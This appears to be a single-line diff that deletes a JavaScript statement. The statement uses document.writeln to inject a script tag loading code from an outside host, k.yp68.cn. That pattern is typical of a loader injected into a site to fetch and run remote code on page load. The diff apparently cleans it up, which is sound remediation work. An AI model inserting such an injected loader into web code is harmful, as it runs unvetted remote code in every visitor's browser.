@@ -1,1 +1,0 @@
-document.writeln("<script src='https://k.yp68.cn/Herfdju.aspx?Gsdew=2266&t='><\/script>");
